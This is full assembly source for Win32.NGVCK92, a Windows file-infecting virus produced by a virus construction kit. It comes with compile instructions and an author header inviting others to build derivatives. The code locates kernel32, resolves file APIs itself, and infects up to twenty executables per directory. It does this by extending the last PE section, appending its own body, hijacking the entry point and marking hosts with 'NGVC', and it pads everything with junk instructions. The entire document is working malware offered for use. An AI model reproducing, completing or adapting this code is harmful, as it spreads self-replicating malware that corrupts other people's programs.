              
;
;
; Win32.NGVCK92 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK92
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 16
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 inc esp
 add esp, 3d
 mov ebx, dword ptr [esp-4]
                                        ; mov ebp, ebx
 push ebx
 pop ebp
 jmp KernelSearchStart
 sub eax, ebx                           ; Trash
 sbb edx, 6d                            ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edi, ebp
 add edi, offset WIN32_FIND_DATA

 push edi
 push dword ptr [ebp+FindHandle]
 pop ecx
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov eax, 276
 push 276d
 pop eax
 neg ecx                                ; Trash
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov edi, -1
 mov edi, ( -1d - 7d )
 add edi, 7d
 and edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, [edi+3Ch]
 add ecx, edi
                                        ; get File Alignment
 mov ebx, [ecx+3Ch]
                                        ; mov eax, -1
 mov eax, ( -1d + 20d )
 sub eax, 20d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 shl ecx, 28d                           ; Trash
 popad
 dec dword ptr [ebp+Trash1]             ; Trash
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
                                        ; infect by increasing the last section
 mov esi, ebx
                                        ; get last section
 movzx eax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
 add ebx, eax
 not ecx                                ; Trash
                                        ; add ebx, 120
 dec ebx
 add ebx, 121d
 mov eax, dword ptr [esi+74h]
 clc
 rcl eax, 3
 add ebx, eax
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], edx
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], eax
                                        ; clear ecx
 sub ecx, ecx

 add ecx, [ebx+10h]
                                        ; mov edx, ecx
 mov edx, ecx
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push edx
 pop eax
 add eax, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
 mov eax, [ebx+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [ebx+08h], eax
 mov eax, dword ptr [ebx+0Ch]
 add eax, dword ptr [ebx+10h]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx
 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 sub edx, edx
 add edx, [ebx+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+ATableVA], ebx
                                        ; get NTableVA
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; add edx, 4
 add edx, 4d
                                        ; get OTableVA
 mov ebx, dword ptr [edx]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; load API Names and Offsets
 lea edi, [ebp+APIOffsets]
 xchg edi, esi

 lea eax, [ebp+APINames]
 xchg eax, ebx


GetApisLoop: 

                                        ; clear edx
 mov edx, 0
 mov dl, byte ptr [ebx]
                                        ; add ebx, 1
 add ebx, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add ebx, edx
                                        ; mov eax, -1
 mov eax, ( -1d + 4d )
 sub eax, 4d
 and eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 sub ecx, 1
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 sub dword ptr [ebp+Trash1], 704292     ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 inc esp
 sub esp, 5d
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 mov ebx, dword ptr [ebp+K32Trys]
 cmp ebx, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 add ecx, -65536d
 push dword ptr [ebp+K32Trys]
 pop eax
 dec eax
 push eax
 pop dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ecx, 60
 add ecx, 60d
 mov eax, [ecx]
 sub ecx, 60d
 xchg eax, ecx
 add ecx, eax
 xchg eax, ecx
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], eax

 lea ebx, GetApis
 neg ecx                                ; Trash
 add ebx, ebp

 push ebx
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 mov ecx, 50417d
 sub ecx, 50417d
 xor ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

 push dword ptr [ebp+OldBase]
 pop eax

 mov dword ptr [ebp+retBase], eax




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov eax, ebp
 add eax, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 xor eax, 37535156d                     ; Trash
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 2d )
 xor ebx, 2d
 and ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 add ebx, 1
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear edx
 and edx, 0
 push edx
 dec dword ptr [ebp+Trash1]             ; Trash
 push ecx
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 dec eax
 inc eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FindHandle  dd 0h
 MapHandle   dd 0h
 Trash1      dd 0h
 AlignTemp   dd 0h
 FileHandle  dd 0h
 counter     dw 0h

 APINames:
 db 13d, 'FindNextFileA'
 db 18d, 'SetFileAttributesA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 13d, 'MapViewOfFile'
 db 14d, 'FindFirstFileA'
 db 11d, 'CreateFileA'
 db 18d, 'GetFileAttributesA'
 db 11d, 'CloseHandle'
 db 09d, 'FindClose'


 APIOffsets:
 XFindNextFileA         dd 0h
 XSetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h

 KernelMZ    dd 0h
 MapAddress  dd 0h
 NewEIP      dd 0h
 OldEIP      dd 0h
 NewSize     dd 0h
 K32Trys     dd 0h
 AlignReg1   dd 0h
 NTableVA    dd 0h
 filemask    db '*.eXE',0
 AlignReg2   dd 0h
 ATableVA    dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h
 TempAPI     dd 0h
 TempApisearch1 dd 0h
 Attributes  dd 0h
 db 'Win32.NGVCK92 by SnakeByte',0
 TempApisearch2 dd 0h
 OTableVA    dd 0h
 OldBase     dd 400000h




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
                                        ; mov ecx, -1
 mov ecx, ( -1d + 3d )
 sub ecx, 3d
 and ecx, dword ptr [ebp+WFD_nFileSizeHigh]
 cmp ecx, 0
 jne NoInfection
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg eax, edx

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d - 10d )
 add eax, 10d
 push eax
 lea edx, [ebp+WFD_szFileName]
 xchg eax, edx


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 mov eax, dword ptr [ebp+WFD_nFileSizeLow]
 cmp eax, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
                                        ; clear ecx
 mov ecx, 0
 dec ecx
 inc ecx
 jz Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 je Notagoodfile
                                        ; clear edi
 sub edi, edi
 add edi, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, 0
 test ebx, ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov cx, word ptr [edi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 and dword ptr [ebp+Trash1], edx        ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov edx, dword ptr [ebp+Attributes]
 push edx
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ebx

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h




 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
                                        ; mov eax, ecx
 mov eax, ecx
                                        ; mov esi, ecx
 push ecx
 pop esi
 mov dword ptr [ebp+TempApisearch1], edx
 mov dword ptr [ebp+TempApisearch2], esi
 push ebx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov cl, byte ptr [esi]
 xor dword ptr [ebp+Trash1], 940205     ; Trash
 cmp cl, byte ptr [ebx]
 jne ApiNotFound
 dec edx
 or edx, edx
 jz FoundApi1
                                        ; add esi, 1
 sub esi, -1d
                                        ; add ebx, 1
 inc ebx
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop eax
 mov esi, dword ptr [ebp+TempApisearch2]
 mov edx, dword ptr [ebp+TempApisearch1]
                                        ; add eax, 4
 inc eax
 add eax, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear eax
 and eax, 0
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, edi
 movzx eax, word ptr [edi]
 clc
 rcl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

 shr edx, 5d                            ; Trash
NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edi
 and edi, 0
 add edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 sub ebp, 1
 inc ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

